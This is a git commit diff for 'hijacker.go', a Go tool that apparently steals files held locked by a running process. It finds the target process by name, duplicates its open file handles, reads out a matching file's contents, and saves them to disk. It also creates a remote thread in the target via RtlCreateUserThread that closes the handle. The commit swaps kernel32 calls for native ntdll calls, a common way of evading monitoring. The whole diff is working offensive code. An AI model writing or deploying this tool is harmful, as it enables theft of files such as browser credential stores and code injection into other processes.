d6adeb0f4801293da62202d86b3ce5094574a4cb
EvilBytecode <151552809+EvilBytecode@users.noreply.github.com>
2025-10-09 15:57:18 +0100

    Update hijacker.go
    use rtl*/nt* api.

--- hijacker.go
+++ hijacker.go
@@ -17,7 +17,10 @@ const (
 	fileWriteAttr  = 0x0100
 	readControl    = 0x20000
 	synchronize    = 0x100000
-	
+	processVmOp    = 0x0008
+	processVmRead  = 0x0010
+	processVmWrite = 0x0020
+
 	statusMismatch = 0xC0000004
 	statusSuccess  = 0x00000000
 	queryInfo      = 0x0400
@@ -27,17 +30,15 @@ const (
 	dosPath        = 0
 	diskType       = 1
 	createAlways   = 2
-	genericRead    = 0x80000000
-	genericWrite   = 0x40000000
-	shareRead      = 0x00000001
-	shareWrite     = 0x00000002
 	normalAttr     = 0x80
 	procSnapshot   = 0x00000002
-	
+
 	fileStandardInfo = 5
 	filePositionInfo = 14
-	
-	maxPath = 32768
+
+	maxPath         = 32768
+	fileOpenIf      = 3
+	fileSyncIoAlert = 0x00000010
 )
 
 type Handle struct {
@@ -62,9 +63,9 @@ type ObjType struct {
 }
 
 type WideStr struct {
-	Size   uint16
-	MaxSz  uint16
-	Data   *uint16
+	Size  uint16
+	MaxSz uint16
+	Data  *uint16
 }
 
 type ProcInfo struct {
@@ -97,62 +98,67 @@ type FilePositionInfo struct {
 	CurrentByteOffset int64
 }
 
+type ObjectAttributes struct {
+	Length                   uint32
+	RootDirectory            syscall.Handle
+	ObjectName               *WideStr
+	Attributes               uint32
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
 type winAPI struct {
 	queryProcess    *syscall.LazyProc
 	queryObject     *syscall.LazyProc
-	close           *syscall.LazyProc
+	closeHandle     *syscall.LazyProc
 	readFile        *syscall.LazyProc
 	queryFileInfo   *syscall.LazyProc
 	setFileInfo     *syscall.LazyProc
 	duplicateObject *syscall.LazyProc
-	getFilePath     *syscall.LazyProc
-	getFileType     *syscall.LazyProc
-	getCurrentProc  *syscall.LazyProc
-	createThread    *syscall.LazyProc
 	openProcess     *syscall.LazyProc
+	createFile      *syscall.LazyProc
+	writeFile       *syscall.LazyProc
+	createThread    *syscall.LazyProc
 	createSnapshot  *syscall.LazyProc
 	nextProcess     *syscall.LazyProc
-	closeHandle     *syscall.LazyProc
-	createFileA     *syscall.LazyProc
-	writeFileData   *syscall.LazyProc
+	getFilePath     *syscall.LazyProc
+	getFileType     *syscall.LazyProc
 }
 
 var api = &winAPI{
 	queryProcess:    syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationProcess"),
 	queryObject:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryObject"),
-	close:           syscall.NewLazyDLL("ntdll.dll").NewProc("NtClose"),
+	closeHandle:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtClose"),
 	readFile:        syscall.NewLazyDLL("ntdll.dll").NewProc("NtReadFile"),
 	queryFileInfo:   syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationFile"),
 	setFileInfo:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtSetInformationFile"),
 	duplicateObject: syscall.NewLazyDLL("ntdll.dll").NewProc("NtDuplicateObject"),
-	getFilePath:     syscall.NewLazyDLL("kernel32.dll").NewProc("GetFinalPathNameByHandleW"),
-	getFileType:     syscall.NewLazyDLL("kernel32.dll").NewProc("GetFileType"),
-	getCurrentProc:  syscall.NewLazyDLL("kernel32.dll").NewProc("GetCurrentProcess"),
-	createThread:    syscall.NewLazyDLL("kernel32.dll").NewProc("CreateRemoteThread"),
-	openProcess:     syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess"),
+	openProcess:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenProcess"),
+	createFile:      syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateFile"),
+	writeFile:       syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteFile"),
+	createThread:    syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCreateUserThread"),
 	createSnapshot:  syscall.NewLazyDLL("kernel32.dll").NewProc("CreateToolhelp32Snapshot"),
 	nextProcess:     syscall.NewLazyDLL("kernel32.dll").NewProc("Process32Next"),
-	closeHandle:     syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle"),
-	createFileA:     syscall.NewLazyDLL("kernel32.dll").NewProc("CreateFileA"),
-	writeFileData:   syscall.NewLazyDLL("kernel32.dll").NewProc("WriteFile"),
+	getFilePath:     syscall.NewLazyDLL("kernel32.dll").NewProc("GetFinalPathNameByHandleW"),
+	getFileType:     syscall.NewLazyDLL("kernel32.dll").NewProc("GetFileType"),
 }
 
 func ScanProcesses(target string) (map[uint32][]Handle, error) {
 	procs := make(map[uint32][]Handle)
-	
+
 	h, _, err := api.createSnapshot.Call(uintptr(procSnapshot), 0)
 	if h == 0 || h == ^uintptr(0) {
 		return nil, fmt.Errorf("snapshot failed: %v", err)
 	}
 	defer api.closeHandle.Call(h)
-	
+
 	info := ProcInfo{Sz: uint32(unsafe.Sizeof(ProcInfo{}))}
-	
+
 	for {
 		if ok, _, _ := api.nextProcess.Call(h, uintptr(unsafe.Pointer(&info))); ok == 0 {
 			break
 		}
-		
+
 		var name string
 		for i, c := range info.Name {
 			if c == 0 {
@@ -160,35 +166,49 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 				break
 			}
 		}
-		
+
 		if !strings.EqualFold(name, target) {
 			continue
 		}
-		
-		proc, _, _ := api.openProcess.Call(uintptr(queryInfo|dupHandle), 0, uintptr(info.Id))
-		if proc == 0 {
+
+		var clientId struct {
+			pid uintptr
+			tid uintptr
+		}
+		clientId.pid = uintptr(info.Id)
+
+		var objAttr ObjectAttributes
+		objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+
+		var proc syscall.Handle
+		if r, _, _ := api.openProcess.Call(
+			uintptr(unsafe.Pointer(&proc)),
+			uintptr(queryInfo|dupHandle),
+			uintptr(unsafe.Pointer(&objAttr)),
+			uintptr(unsafe.Pointer(&clientId)),
+		); r != statusSuccess {
 			continue
 		}
-		
+
 		var bufLen uint32
 		var mem []byte
 		code := uint32(statusMismatch)
-		
+
 		for code == statusMismatch {
 			var p uintptr
 			if bufLen > 0 {
 				mem = make([]byte, bufLen)
 				p = uintptr(unsafe.Pointer(&mem[0]))
 			}
-			
-			r, _, _ := api.queryProcess.Call(proc, handleClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
+
+			r, _, _ := api.queryProcess.Call(uintptr(proc), handleClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
 			code = uint32(r)
 		}
-		
+
 		if code == statusSuccess && bufLen >= uint32(unsafe.Sizeof(Snapshot{})) {
 			snap := (*Snapshot)(unsafe.Pointer(&mem[0]))
 			n := snap.Total
-			
+
 			if n > 0 && bufLen >= uint32(unsafe.Sizeof(Snapshot{})+uintptr(n)*unsafe.Sizeof(Handle{})) {
 				off := unsafe.Sizeof(Snapshot{})
 				items := make([]Handle, n)
@@ -199,152 +219,253 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 				procs[info.Id] = items
 			}
 		}
-		
-		api.closeHandle.Call(proc)
+
+		api.closeHandle.Call(uintptr(proc))
 	}
-	
+
 	return procs, nil
 }
 
 func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, string, error) {
-	proc, _, _ := api.openProcess.Call(uintptr(dupHandle), 0, uintptr(owner))
-	if proc == 0 {
+	var clientId struct {
+		pid uintptr
+		tid uintptr
+	}
+	clientId.pid = uintptr(owner)
+
+	var objAttr ObjectAttributes
+	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+
+	var proc syscall.Handle
+	if r, _, _ := api.openProcess.Call(
+		uintptr(unsafe.Pointer(&proc)),
+		uintptr(dupHandle),
+		uintptr(unsafe.Pointer(&objAttr)),
+		uintptr(unsafe.Pointer(&clientId)),
+	); r != statusSuccess {
 		return nil, "", fmt.Errorf("access denied")
 	}
-	defer api.closeHandle.Call(proc)
-	
+	defer api.closeHandle.Call(uintptr(proc))
+
 	var dup syscall.Handle
-	self, _, _ := api.getCurrentProc.Call()
-	if self == 0 {
-		return nil, "", fmt.Errorf("failed to get current process")
-	}
-	
+	self := ^uintptr(0) // this is called pseudohandle for current process (-1)
+
 	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
-	if r, _, _ := api.duplicateObject.Call(proc, uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
+	if r, _, _ := api.duplicateObject.Call(uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
 		return nil, "", fmt.Errorf("dup error: %x", r)
 	}
-	defer api.close.Call(uintptr(dup))
-	
+	defer api.closeHandle.Call(uintptr(dup))
+
 	var bufLen uint32
 	var mem []byte
 	code := uint32(statusMismatch)
-	
+
 	for code == statusMismatch {
 		var p uintptr
 		if bufLen > 0 {
 			mem = make([]byte, bufLen)
 			p = uintptr(unsafe.Pointer(&mem[0]))
 		}
-		
+
 		r, _, _ := api.queryObject.Call(uintptr(dup), typeClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
 		code = uint32(r)
 	}
-	
+
 	if code != statusSuccess {
 		return nil, "", fmt.Errorf("query failed: %x", code)
 	}
-	
+
 	obj := (*ObjType)(unsafe.Pointer(&mem[0]))
 	if obj.Name.Data == nil {
 		return nil, "", fmt.Errorf("no name")
 	}
-	
+
 	sz := int(obj.Name.Size / 2)
 	if sz > 256 {
 		sz = 256
 	}
 	buf := (*[256]uint16)(unsafe.Pointer(obj.Name.Data))[:sz:sz]
 	kind := syscall.UTF16ToString(buf)
-	
+
 	if kind != "File" {
 		return nil, "", fmt.Errorf("wrong type: %s", kind)
 	}
-	
+
 	if t, _, _ := api.getFileType.Call(uintptr(dup)); t != diskType {
 		return nil, "", fmt.Errorf("not disk file")
 	}
-	
+
 	pathbuf := make([]uint16, maxPath)
 	r, _, _ := api.getFilePath.Call(uintptr(dup), uintptr(unsafe.Pointer(&pathbuf[0])), uintptr(len(pathbuf)), dosPath)
 	if r == 0 {
 		return nil, "", fmt.Errorf("path error")
 	}
-	
+
 	fullpath := syscall.UTF16ToString(pathbuf)
-	
+
 	sep := strings.LastIndex(fullpath, "\\")
 	if sep == -1 {
 		sep = strings.LastIndex(fullpath, "/")
 	}
-	
+
 	var basename string
 	if sep == -1 {
 		basename = fullpath
 	} else {
 		basename = fullpath[sep+1:]
 	}
-	
+
 	if !strings.EqualFold(basename, pattern) {
 		return nil, "", fmt.Errorf("no match: got %s, want %s", basename, pattern)
 	}
-	
+
 	var stdInfo FileStandardInfo
 	var iosb IoStatusBlock
-	
+
 	if r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
 		return nil, fullpath, fmt.Errorf("size error: %x", r)
 	}
-	
+
 	fsz := stdInfo.EndOfFile
 	if fsz == 0 {
 		return []byte{}, fullpath, nil
 	}
-	
+
 	var posInfo FilePositionInfo
 	posInfo.CurrentByteOffset = 0
 	api.setFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)
-	
+
 	content := make([]byte, fsz)
 	iosb = IoStatusBlock{}
-	
+
 	if r, _, _ := api.readFile.Call(uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
 		return nil, fullpath, fmt.Errorf("read error: %x", r)
 	}
-	
+
 	return content[:iosb.Info], fullpath, nil
 }
 
 func SaveFile(content []byte, dest string) error {
-	cstr, err := syscall.BytePtrFromString(dest)
+	var abspath string
+	if len(dest) >= 2 && dest[1] == ':' {
+		abspath = dest
+	} else {
+		cwd := make([]uint16, 260)
+		getCwd := syscall.NewLazyDLL("kernel32.dll").NewProc("GetCurrentDirectoryW")
+		n, _, _ := getCwd.Call(uintptr(len(cwd)), uintptr(unsafe.Pointer(&cwd[0])))
+		if n == 0 {
+			return fmt.Errorf("failed to get current directory")
+		}
+		cwdStr := syscall.UTF16ToString(cwd)
+		abspath = cwdStr + "\\" + dest
+	}
+
+	abspath = "\\??\\" + abspath
+
+	path16, err := syscall.UTF16FromString(abspath)
 	if err != nil {
 		return err
 	}
-	
-	f, _, _ := api.createFileA.Call(uintptr(unsafe.Pointer(cstr)), genericWrite, uintptr(shareRead|shareWrite), 0, createAlways, normalAttr, 0)
-	if f == 0 || f == ^uintptr(0) {
-		return fmt.Errorf("failed to create file")
+
+	var ustr WideStr
+	ustr.Size = uint16((len(path16) - 1) * 2)
+	ustr.MaxSz = ustr.Size + 2
+	ustr.Data = &path16[0]
+
+	var objAttr ObjectAttributes
+	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+	objAttr.ObjectName = &ustr
+	objAttr.Attributes = 0x40 // obj_case_insensitive
+
+	var iosb IoStatusBlock
+	var h syscall.Handle
+
+	r, _, _ := api.createFile.Call(
+		uintptr(unsafe.Pointer(&h)),
+		uintptr(fileWriteData|fileAppendData|synchronize),
+		uintptr(unsafe.Pointer(&objAttr)),
+		uintptr(unsafe.Pointer(&iosb)),
+		0, 
+		normalAttr,
+		0,          // shareAccess
+		5,          // file_overwrite_if
+		0x00000020, // file_synchronous_io_nonalert
+		0,
+		0,
+	)
+
+	if r != statusSuccess {
+		return fmt.Errorf("failed to create file: %x", r)
 	}
-	defer api.closeHandle.Call(f)
-	
-	var wrote uint32
-	if r, _, _ := api.writeFileData.Call(f, uintptr(unsafe.Pointer(&content[0])), uintptr(len(content)), uintptr(unsafe.Pointer(&wrote)), 0); r == 0 {
-		return fmt.Errorf("failed to write file")
+	defer api.closeHandle.Call(uintptr(h))
+
+	iosb = IoStatusBlock{}
+
+	r, _, _ = api.writeFile.Call(
+		uintptr(h),
+		0, // event
+		0, // apcroutine
+		0, // apccontext 
+		uintptr(unsafe.Pointer(&iosb)),
+		uintptr(unsafe.Pointer(&content[0])),
+		uintptr(len(content)),
+		0, // byteoffset
+		0, // key
+	)
+
+	if r != statusSuccess {
+		return fmt.Errorf("failed to write file: %x", r)
 	}
-	
+
 	return nil
 }
 
 func KillHandle(owner uint32, hnd syscall.Handle) error {
-	proc, _, _ := api.openProcess.Call(dupHandle, 0, uintptr(owner))
-	if proc == 0 {
-		return fmt.Errorf("failed to open process")
+	var clientId struct {
+		pid uintptr
+		tid uintptr
 	}
-	defer api.closeHandle.Call(proc)
-	fn := api.close.Addr()
-	thd, _, _ := api.createThread.Call(proc, 0, 0, fn, uintptr(hnd), 0, 0)
-	if thd == 0 {
-		return fmt.Errorf("failed to create remote thread")
+	clientId.pid = uintptr(owner)
+
+	var objAttr ObjectAttributes
+	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+
+	var proc syscall.Handle
+	// Need process_create_thread (0x0002) for rtlcreateuserthread
+	processCreateThread := uint32(0x0002)
+	if r, _, _ := api.openProcess.Call(
+		uintptr(unsafe.Pointer(&proc)),
+		uintptr(dupHandle|processVmOp|processVmRead|processVmWrite|processCreateThread),
+		uintptr(unsafe.Pointer(&objAttr)),
+		uintptr(unsafe.Pointer(&clientId)),
+	); r != statusSuccess {
+		return fmt.Errorf("failed to open process: %x", r)
 	}
-	api.closeHandle.Call(thd)
+	defer api.closeHandle.Call(uintptr(proc))
+
+	fn := api.closeHandle.Addr()
+	var thd syscall.Handle
+
+	// Use RtlCreateUserThread
+	// params: Process, SecurityDescriptor, CreateSuspended, StackZeroBits,
+	// StackReserved, StackCommit, StartAddress, Parameter, Thread, ClientId
+	r, _, _ := api.createThread.Call(
+		uintptr(proc),
+		0,            // securydescritpor
+		0,            // createsuspnended
+		0,            // stackzerobits
+		0,            // stackreserved
+		0,            // stackcommit
+		fn,           // startaddr (NtClose)
+		uintptr(hnd), // param
+		uintptr(unsafe.Pointer(&thd)),
+		0, // clientid
+	)
+
+	if r != statusSuccess {
+		return fmt.Errorf("failed to create remote thread: %x", r)
+	}
+
+	api.closeHandle.Call(uintptr(thd))
 	return nil
 }
